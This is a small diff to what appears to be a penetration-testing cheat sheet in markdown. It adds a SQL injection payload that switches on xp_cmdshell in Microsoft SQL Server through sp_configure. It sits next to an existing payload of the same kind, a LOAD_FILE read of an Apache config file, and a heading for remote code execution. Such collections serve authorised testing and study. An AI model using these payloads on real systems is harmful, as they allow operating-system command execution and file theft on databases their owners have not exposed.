@@ -2893,6 +2893,9 @@ LOAD_FILE('/etc/httpd/conf/httpd.conf')
 ```c
 ' UNION SELECT 1, null; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;--
 ```
+```c
+'; EXEC sp_configure 'Show Advanced Options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;-- //
+```
 
 ###### Remote Code Execution (RCE)
 
